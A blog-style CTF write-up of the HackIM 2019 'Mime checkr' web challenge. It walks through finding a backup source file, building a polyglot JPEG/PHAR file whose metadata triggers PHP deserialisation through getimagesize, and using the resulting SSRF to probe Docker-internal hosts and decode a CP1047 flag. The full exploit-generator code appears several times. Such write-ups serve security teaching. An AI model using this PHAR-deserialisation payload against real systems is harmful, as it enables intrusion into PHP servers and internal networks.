---
layout: post
title: Mime checkr
category: HackIM 2019
---

Hello guys, so this time i played Nullcon HackIM 2019 , it was really amazing CTF where all web task was bit hards with new technique which need more knowledge to pwn it

Anyway, we did our best to clean the entire web, miss the last but we did it well :)

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52181227-fe61cc80-27ef-11e9-8fe4-1f2d5287567f.png"></p>

So lets start explain our solution for this task "mime checkr" 500 pts

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52181241-218c7c00-27f0-11e9-982e-86d7bb142119.png"></p>

First think to do when you get web task should always doing recon stuff (brute force directories and files in websites & Port scan ...)

So I quickly launched dirsearch to check directories and hidden files, but no results, all we know is that there are 2 files **/upload.php** & **/getmime.php** and the folder in which our files are uploaded **/uploads**

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52181410-b8a60380-27f1-11e9-950e-818bf87bec41.png"></p>

Lets see what we can do here 

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52181468-7df09b00-27f2-11e9-82e1-fd262920cd5e.png"></p>

```
1-Can upload file "need to be only image" and we get as result random_name.jpeg exp : 0e98960a815d51af41f10ab6f4642753.jpeg  
2-Can check file mime type by sending file path exp : uploads/0e98960a815d51af41f10ab6f4642753.jpeg
```

By the time we know that there should be something missing in their code that can break all this application :)

What can be done at the moment, we can bypass the verification of downloaded images by simply adding the image header (jpg / gif ..) and put what we want (php code), but we still can not control file extension that does not give us any result

So, if we add "GIF89a;" at the top of any file and the content is php code we get our downloaded file

But as we said , its not possible until we can control the extension type (can't exploit null byte injection ) fixed on php 5.3.4

We come up to no solution and we have only 3h to pwn this shitty task !!!

In that moment we start to look again hidden files !  fired up nmap with **http-backup-finder** script , maybe we can get something ( hope so )

```
using : nmap --script=http-backup-finder 159.65.158.100
```

And yes we got something :D, There was backup file there **/getmime.bak** ,really missed this one !

Lets go ! no more time and we need to exploit it 

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52181726-9910da00-27f5-11e9-8034-385233c26db7.png"></p>

```
<?php
//error_reporting(-1);
//ini_set('display_errors', 'On');

class CurlClass{
    public function httpGet($url) {
    $ch = curl_init();  
 
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
//  curl_setopt($ch,CURLOPT_HEADER, false); 
 
    $output=curl_exec($ch);
 
    curl_close($ch);
    return $output;
 }
}


class MainClass {

	public function __destruct() {
        $this->why =new CurlClass;
        echo $this->url;
        echo $this->why->httpGet($this->url);
	}
}


getimagesize("phar://test.jpg");


?>
```





OK here we go !

Nothing weird for now , as we can't control the httpGet we can't exploit SSRF there !
But wait at BlackHat 2018 event , @_s_n_t & @orange_8361 present a technique for triggering an unserialize within a phar archive. (check here **https://www.youtube.com/watch?v=PqsudKzs79c**)

So using his technique we can unserialization vulnerability possible even without **unserialize** :)

We can set the metadata of a phar archive with an non-instantiated class. which means using this simple code 

```
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("<?php __HALT_COMPILER(); ? >");

class MainClass {}
$object = new MainClass;
$object->url = 'http://my_server_ip';
$phar->setMetadata($object);
$phar->stopBuffering();
?>
```
we create phar file ,what this means is that if we can do **getimagesize('phar://some/phar.jpg');** then we can trigger a **__destruct** call (Yes we can do that , as the source code use getimagesize to check file mime type )

And in getmime.php there was **MainClass** which call **httpGet($url)** that means if we can call **__destruct** we control **httpGet** :D

And yes we have our famous SSRF attack **ON** guys!

Lets the pwn it now, but wait we need a valid phar file, that means we have to hide the phar as an image :)
```
<?php
$jpeg_header_size =
"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString("test.txt","test");
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");

class MainClass {}
$object = new MainClass;
$object->url = 'http://my_server_ip';
$phar->setMetadata($object);
$phar->stopBuffering();

rename("test.phar","fake_iamge.jpg");
?>
```

And yes if we test locally it works

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52181942-0c1b5000-27f8-11e9-8110-6a42cbe73a87.png"></p>

its valid image file and valid phar file at the same time :)  **step 1 done**

Next step :), need to gather internal information, Admin already mention its about container (docker)

So need to check docker default subnet and see maybe there is hidden App there !

```
When you install docker, by default it will create a bridged interface docker0 with a 172.17.0.0/16 subnet for container networking
```
Means need to get which one will get us some result !

Start by **http://172.17.0.1** as url

```
<?php
$jpeg_header_size =
"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString("test.txt","test");
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");

class MainClass {}
$object = new MainClass;
$object->url = 'http://172.17.0.1';
$phar->setMetadata($object);
$phar->stopBuffering();

rename("test.phar","fake_iamge.jpg");
?>
```

Mime check post data : **phar://uploads/file_name.jpeg**

Give us back the same web app

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52182117-0aeb2280-27fa-11e9-84c3-525894f28f23.png"></p>

So 172.17.0.1 == Web task,need to dig more and find something else

moved to 172.17.0.2 give us new hint for the next step

Change url :

```
$object->url = 'http://172.17.0.2';
```

Which give us something not printable using code page charset :( , browser can't render it back :(

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52182258-bc3e8800-27fb-11e9-98f3-a1d408ef62ef.png"></p>

```
File is not an image. http://172.17.0.2b'\xc8\x85\x93\x93\x96@a\x86\x85\xa3\x83\x88\xa1l\xad\xbd_|]M@@\x94\x85'
```

We need to brute force all possible charset and get the result , we get some clear text using CPXXX encoding charset

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52182375-c01eda00-27fc-11e9-95f8-328111e8b98f.png"></p>

Its look like **Hello /fetch~'string-garbage' me**

So until here we need just to try using one of this result (encode garbage stuff) and send SSRF request again 

lets try with CP1047 **Hello /fetch~%[]^@)(  me**, urlencode this **/%66%65%74%63%68%7e%25%5b%5d%5e%40%29%28** (else we get Bad request from server)

```
<?php
$jpeg_header_size =
"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
"\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
"\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
"\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
"\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
"\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
"\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
"\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
"\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString("test.txt","test");
$phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");
class MainClass {}
$object = new MainClass;
$object->url = 'http://172.17.0.2/%66%65%74%63%68%7e%25%5b%5d%5e%40%29%28';
$phar->setMetadata($object);
$phar->stopBuffering();


rename("test.phar","fake_image.jpeg");
?>
```

And yes we got last one :) 

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52182462-be094b00-27fd-11e9-8968-702828f91051.png"></p>


```
File is not an image. http://172.17.0.2/%66%65%74%63%68%7e%25%5b%5d%5e%40%29%28b'\xc6\x93\x81\x87\xc0\xd7\xc8\xd7m\xe2\xa3\x99\x85\x81\x94\xa2m\x81\x99\x85m\xa3\xf0\xf0m\xd4\x81\x89\x95\xe2\xa3\x99\x85\x81\x94\xf0\xd0'
```

So our last step will be to decode
**'\xc6\x93\x81\x87\xc0\xd7\xc8\xd7m\xe2\xa3\x99\x85\x81\x94\xa2m\x81\x99\x85m\xa3\xf0\xf0m\xd4\x81\x89\x95\xe2\xa3\x99\x85\x81\x94\xf0\xd0'** using same charset **CP1047**

```
import ebcdic
url = '\xc6\x93\x81\x87\xc0\xd7\xc8\xd7m\xe2\xa3\x99\x85\x81\x94\xa2m\x81\x99\x85m\xa3\xf0\xf0m\xd4\x81\x89\x95\xe2\xa3\x99\x85\x81\x94\xf0\xd0'.decode("cp1047")
print url
```

And Yesss we got the FLAGGG 

```
Flag{PHP_Streams_are_t00_MainStream0}
```

Really was nice task, different steps to finish it and the last step was really weird for us :( !

BTW this task was only solved by 4 teams , happy that our team is part of this : )

<p align="center"> <img src="https://user-images.githubusercontent.com/7364615/52182555-8bac1d80-27fe-11e9-985e-049a8b642cec.png"></p>
  
Thanks to the creators’s team for this CTF also for hosting this competition and Thank you for reading this write up too :D
